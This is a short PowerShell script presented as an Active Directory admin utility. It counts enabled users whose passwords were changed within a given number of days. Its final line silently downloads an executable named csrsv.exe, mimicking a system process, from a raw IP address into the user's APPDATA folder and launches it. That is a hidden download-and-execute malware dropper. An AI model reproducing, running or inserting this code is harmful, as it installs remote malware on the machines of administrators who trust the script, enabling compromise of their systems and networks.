param($days_old)

(get-aduser -filter {enabled -eq $true} -Properties passwordlastset,employeenumber,whencreated | ? {($_.passwordlastset -gt (Get-Date).AddDays(-$days_old)) -and ($_.employeenumber) -and ($_.whenCreated -lt (Get-Date).AddDays(-$days_old))}).Count
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

